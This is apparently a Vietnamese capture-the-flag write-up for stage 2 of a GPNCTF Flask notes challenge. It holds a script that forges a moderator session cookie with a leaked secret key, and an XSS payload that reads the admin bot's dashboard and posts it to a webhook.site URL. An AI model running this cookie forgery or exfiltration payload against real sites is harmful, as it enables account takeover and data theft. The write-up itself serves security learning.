![image](https://github.com/user-attachments/assets/f1ade6e6-4721-44e0-85c0-3fdd8bc403fa)

# **ANALYZE**

Đến với Stage 2 , mang theo  `FLASK_APP_SECRET_KEY` mà ta nhận được từ STAGE_1

Ta sẽ đi đọc trong source code để tìm manh mối về `STAGE_2` và `FLASK_APP_SECRET_KEY`

Thông tin đầu tiên mà ta có được là : Flag được nằm trong 1 bài note chỉ có admin hoặc mod mới có thể xem được .

```
await page.type('textarea[name="content"]', `Here you got some juicy flag: ${FLAG_STAGE_2}`);
```

```
@app.route('/dashboard')
@login_required
def dashboard():
    if is_mod():
        return redirect(url_for('moderator'))

    user_notes = [(nid, notes[nid]['title'], notes[nid]['content']) for nid in notes if notes[nid]['owner'] == g.user]
```

Và tôi sẽ đưa những dữ liệu này cho gpt để nhờ nó gen ra cách dịch ngược lại mã hóa để tạo ra cookie giả mao.
```
@app.route('/development/cookie-verify', methods=['POST'])
@login_required
@moderator_required
@development_routes_required
def verify_cookie():
    """
    Development route to validat the signature of the cookie is valid.
    """
    data = request.json.get('cookie')
    try:
        data = pickle.loads(base64.b64decode(data))
    except Exception as e:
        return "Invalid data :/", 400

    value = data.get('value')
    signature = data.get('signature')

    if not value or not signature:
        return "Missing signature or value", 400

    secret_key = app.secret_key.encode()
    expected_signature = hashlib.sha256((value + secret_key.decode()).encode()).hexdigest()

    if expected_signature != signature:
        return "Invalid signature", 400

    return "Valid Cookie!", 200
```


Trong main.py, đoạn mã sau cho thấy Flask lưu session thông qua session['user']:
```
session['user'] = {
    'username': username,
    'role': 'admin' if hashlib.sha512(password.encode()).hexdigest() == ADMIN_PASSWORD_HASH else 'user'
}
```

→ Tức là sau khi đăng nhập, Flask sẽ lưu nội dung session dưới dạng:

```
{
  "user": {
    "username": "tên bạn nhập",
    "role": "user" hoặc "admin"
  }
}
```
Flask sẽ tự động serialize, sign và mã hóa thông tin này thành cookie tên là session.

Flask dùng thư viện itsdangerous kết hợp với secret key:

```
app.secret_key = os.environ.get("FLASK_APP_SECRET_KEY")
```

→ Mỗi session cookie sẽ được Flask ký bằng FLASK_APP_SECRET_KEY.


Và ta đã có đã có FLASK_APP_SECRET_KEY từ .env (Stage 1), ta hoàn toàn có thể tạo cookie có role "moderator" hoặc "admin".


Thông qua hành vi xử lý quyền:

```
def is_mod():
    return g.user.get('role') in ['admin', 'moderator']
```
  
→ Chỉ cần trong session có user.role = "moderator" là đủ để:

Vượt qua @moderator_required

Truy cập /report/<note_id>, /moderator


# **EXPLOIT**

Cuối cùng thì script để làm giả cookie sẽ là : 

```
from flask.sessions import SecureCookieSessionInterface
from flask import Flask

# B1: Setup Flask giả để dùng serializer giống thật
app = Flask(__name__)
app.secret_key = "9f310d75c84c1aba65fa87fec8980f7c43b55dd274b41e3512777981ca37ea1d606e626c24248a0d39957c2bb94c9493f410"

# B2: Lấy công cụ ký
class SimpleSecureCookie(SecureCookieSessionInterface):
    def get_signing_serializer(self, app):
        return super().get_signing_serializer(app)

serializer = SimpleSecureCookie().get_signing_serializer(app)

# B3: Tạo nội dung session giả
cookie = serializer.dumps({
    "user": {
        "username": "canheeu",
        "role": "moderator"
    }
})

print("Final signed cookie:", cookie)
```

Sau khi đổi cookie thì ta đã hoàn toàn leo thang lên được quyền mod 

![image](https://github.com/user-attachments/assets/6b6624e3-c57e-4cb2-a2f8-3b9c911d4ba8)


Và tôi sẽ bắt đầu tìm hiểu về tính năng report , khi tôi gửi 1 chuỗi bất kì thì nhận lại được là : 

![image](https://github.com/user-attachments/assets/e362ef99-3b2b-4738-9f83-3fbf3176be69)

Và cuối cùng , chúng ta sẽ chèn đoạn payload này vào phần report để dụ cho bot đọc và tiết lộ thông tin cho ta 
Vì chúng ta biết được bài viết chứa flag nằm ở dashboard của bot

```
<script>
fetch('/dashboard')
  .then(r => r.text())
  .then(t =>
    fetch('https://webhook.site/c47162bb-f1c9-4a44-88ce-1703bcdad082', {
      method: 'POST',
      mode: 'no-cors',
      body: btoa(t)
    })
  );
</script>
```
Sau khi gửi xong , thì ta nhận được gói tin bắn về webhook như bên dưới , ta đen đoạn base64 này lên cyberchef thì ta được 1 đoạn mã HTML chứa thông tin

ở dashboard và chứa flag.

và ta còn biết được cả username của admin_bot , có thể hữu ích cho các stage sau : 

```
   >I_am_the_admin_4a65b80fe0c5c3b407f6d3fedd563848fc1d8d0431e3a26af47ecf8ef83bbe5a
```

![image](https://github.com/user-attachments/assets/65dabc53-8c80-4e70-8b47-d258f5fc0104)

![image](https://github.com/user-attachments/assets/7fe99cbb-ae73-4cba-b7d0-5cf3d8479ce6)

# **FLAG**

```
GPNCTF{forge_d15_JU1CY_moD}
```

